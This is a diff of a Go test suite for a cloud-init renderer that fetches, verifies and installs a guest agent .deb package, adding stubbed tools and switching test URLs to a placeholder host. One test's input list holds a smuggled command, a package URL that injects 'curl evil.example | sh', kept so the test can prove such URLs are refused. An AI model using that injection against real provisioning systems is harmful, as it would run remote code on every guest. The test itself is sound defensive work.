@@ -17,9 +17,8 @@ import (
 	"gopkg.in/yaml.v3"
 )
 
-// The artifact store the agent package is actually served from. Plain HTTP,
-// no authentication — which is why the digest below is load-bearing.
-const testPkgURL = "http://10.31.0.2/local/qubes-air/qubes-air-agent_0.1.0_amd64.deb"
+// An unauthenticated fixture URL; the pinned digest must remain authoritative.
+const testPkgURL = "http://artifacts.example.invalid/qubes-air-agent_0.1.0_amd64.deb"
 
 // testPkgPayload stands in for the .deb; the tests hash it themselves so a
 // "matching" digest really matches and a mismatching one really does not.
@@ -400,9 +399,9 @@ func TestUppercaseDigestIsNormalized(t *testing.T) {
 // into remote code execution on the whole fleet.
 func TestUnsafePackageURLIsNeverEmbedded(t *testing.T) {
 	for _, bad := range []string{
-		"http://10.31.0.2/x.deb'; curl evil.example | sh; echo '",
+		"http://artifacts.example.invalid/x.deb'; curl evil.example | sh; echo '",
 		"file:///tmp/x.deb",
-		"http://10.31.0.2/a b.deb",
+		"http://artifacts.example.invalid/a b.deb",
 	} {
 		out, _ := renderWith(t, AgentPackage{URL: bad, SHA256: testPkgSHA()})
 		assert.NotContains(t, out, bad, "an unsafe URL must not reach the guest")
@@ -447,19 +446,30 @@ func TestURLWithoutDigestIsRefused(t *testing.T) {
 // installerRun is what a guest would have observed: the installer's exit
 // status, everything it invoked, what it said, and the failure marker it left.
 type installerRun struct {
-	code   int
-	calls  string
-	output string
-	marker string
+	code            int
+	calls           string
+	output          string
+	marker          string
+	downloadRemains bool
 }
 
-func (r installerRun) installed() bool { return strings.Contains(r.calls, "dpkg -i") }
+func (r installerRun) installed() bool {
+	return strings.Contains(r.calls, "dpkg -i") || strings.Contains(r.calls, "apt-get install")
+}
+
+type installerTools struct {
+	realCurl            bool
+	withoutCurl         bool
+	caBundle            string
+	missingDependencies string
+	aptExit             string
+}
 
 // runInstaller executes the delivered installer against stubbed system tools.
 //
 // The script is what actually protects the fleet, so it is exercised rather
 // than pattern-matched: reading "sha256sum -c" in the output proves the string
-// is present, not that a mismatch stops before dpkg.
+// is present, not that a mismatch stops before package installation.
 func runInstaller(t *testing.T, userData string, systemctlExit string) installerRun {
 	return runInstallerWithStates(t, userData, systemctlExit, "")
 }
@@ -467,6 +477,11 @@ func runInstaller(t *testing.T, userData string, systemctlExit string) installer
 // runInstallerWithStates drives the sequence systemctl is-active reports, so a
 // test can reproduce "forked, then died" rather than only steady states.
 func runInstallerWithStates(t *testing.T, userData, systemctlExit, states string) installerRun {
+	t.Helper()
+	return runInstallerWithTools(t, userData, systemctlExit, states, installerTools{})
+}
+
+func runInstallerWithTools(t *testing.T, userData, systemctlExit, states string, tools installerTools) installerRun {
 	t.Helper()
 	if _, err := exec.LookPath("sh"); err != nil {
 		t.Skip("no sh available")
@@ -476,14 +491,16 @@ func runInstallerWithStates(t *testing.T, userData, systemctlExit, states string
 	script := fileContent(t, parseConfig(t, userData), agentInstallerPath)
 	require.NotEmpty(t, script)
 
-	// Redirect the two absolute paths the guest owns. Asserting they were
+	// Redirect the absolute output paths the guest owns. Asserting they were
 	// present first means a rename in cloudinit.go fails this test loudly
 	// instead of quietly running an unredirected script.
 	require.Contains(t, script, "DEB=/run/qubes-air-agent.deb")
 	require.Contains(t, script, "MARKER='"+agentFailureMarker+"'")
+	require.Contains(t, script, "/dev/console")
 	marker := filepath.Join(dir, "marker")
 	script = strings.ReplaceAll(script, "DEB=/run/qubes-air-agent.deb", "DEB="+dir+"/download.deb")
 	script = strings.ReplaceAll(script, "MARKER='"+agentFailureMarker+"'", "MARKER='"+marker+"'")
+	script = strings.ReplaceAll(script, "/dev/console", filepath.Join(dir, "serial-console"))
 
 	scriptPath := filepath.Join(dir, "install")
 	require.NoError(t, os.WriteFile(scriptPath, []byte(script), 0o700))
@@ -492,14 +509,20 @@ func runInstallerWithStates(t *testing.T, userData, systemctlExit, states string
 	require.NoError(t, os.WriteFile(payload, testPkgPayload, 0o600))
 	calls := filepath.Join(dir, "calls.log")
 	stubs := writeStubs(t, dir)
+	toolPath := configureInstallerTools(t, stubs, tools)
 
 	cmd := exec.Command("sh", scriptPath)
 	cmd.Env = append(os.Environ(),
-		"PATH="+stubs+":/usr/bin:/bin",
+		"PATH="+toolPath,
 		"STUB_LOG="+calls,
 		"STUB_PAYLOAD="+payload,
 		"STUB_SYSTEMCTL_EXIT="+systemctlExit,
 		"STUB_ACTIVE_STATES="+states,
+		"STUB_DEPENDENCIES_MISSING="+tools.missingDependencies,
+		"STUB_APT_EXIT="+tools.aptExit,
+		"CURL_CA_BUNDLE="+tools.caBundle,
+		"NO_PROXY=127.0.0.1,localhost,::1",
+		"no_proxy=127.0.0.1,localhost,::1",
 	)
 	out, err := cmd.CombinedOutput()
 
@@ -516,7 +539,28 @@ func runInstallerWithStates(t *testing.T, userData, systemctlExit, states string
 	if b, readErr := os.ReadFile(marker); readErr == nil {
 		run.marker = string(b)
 	}
+	_, downloadErr := os.Stat(filepath.Join(dir, "download.deb"))
+	run.downloadRemains = downloadErr == nil
 	return run
+}
+
+func configureInstallerTools(t *testing.T, stubs string, tools installerTools) string {
+	t.Helper()
+	if tools.realCurl || tools.withoutCurl {
+		require.NoError(t, os.Remove(filepath.Join(stubs, "curl")))
+	}
+	if tools.realCurl {
+		curl, err := exec.LookPath("curl")
+		require.NoError(t, err, "real HTTPS redirect regression requires curl")
+		require.NoError(t, os.Symlink(curl, filepath.Join(stubs, "curl")))
+	}
+	if tools.withoutCurl {
+		rm, err := exec.LookPath("rm")
+		require.NoError(t, err)
+		require.NoError(t, os.Symlink(rm, filepath.Join(stubs, "rm")))
+		return stubs
+	}
+	return stubs + ":/usr/bin:/bin"
 }
 
 // writeStubs provides the guest tools the installer calls. sha256sum is the
@@ -560,6 +604,20 @@ digest "$@"
 `)
 	write("dpkg", `#!/bin/sh
 echo "dpkg $*" >> "$STUB_LOG"
+exit "${STUB_DEPENDENCIES_MISSING:-0}"
+`)
+	write("apt-get", `#!/bin/sh
+echo "apt-get $*" >> "$STUB_LOG"
+[ "${DEBIAN_FRONTEND:-}" = noninteractive ] || exit 2
+exit "${STUB_APT_EXIT:-0}"
+`)
+	write("timeout", `#!/bin/sh
+shift 2
+exec "$@"
+`)
+	write("wget", `#!/bin/sh
+echo "wget $*" >> "$STUB_LOG"
+exit 1
 `)
 	// is-active must answer on STDOUT: the installer captures the state rather
 	// than sampling a single exit code, because Type=simple reports "active" at
@@ -807,8 +865,8 @@ func TestAgentCanWriteItsOwnIdentity(t *testing.T) {
 // guest agent and the hostname. Each looked unrelated until traced back.
 func TestAptMirrorDominatesProvisioningTime(t *testing.T) {
 	pkg := testAgentPackage()
-	pkg.AptMirror = "http://10.31.0.2/debian"
-	pkg.AptSecurityMirror = "http://10.31.0.2/debian-security"
+	pkg.AptMirror = "http://artifacts.example.invalid/debian"
+	pkg.AptSecurityMirror = "http://artifacts.example.invalid/debian-security"
 	out, _ := renderWith(t, pkg)
 
 	var cc struct {
@@ -823,9 +881,9 @@ func TestAptMirrorDominatesProvisioningTime(t *testing.T) {
 	}
 	require.NoError(t, yaml.Unmarshal([]byte(out), &cc))
 	require.Len(t, cc.Apt.Primary, 1)
-	assert.Equal(t, "http://10.31.0.2/debian", cc.Apt.Primary[0].URI)
+	assert.Equal(t, "http://artifacts.example.invalid/debian", cc.Apt.Primary[0].URI)
 	require.Len(t, cc.Apt.Security, 1)
-	assert.Equal(t, "http://10.31.0.2/debian-security", cc.Apt.Security[0].URI,
+	assert.Equal(t, "http://artifacts.example.invalid/debian-security", cc.Apt.Security[0].URI,
 		"Debian serves security from a separate path; reusing the primary reintroduces most of the delay")
 
 	// The stanza must precede packages:, or the sources are not in place when
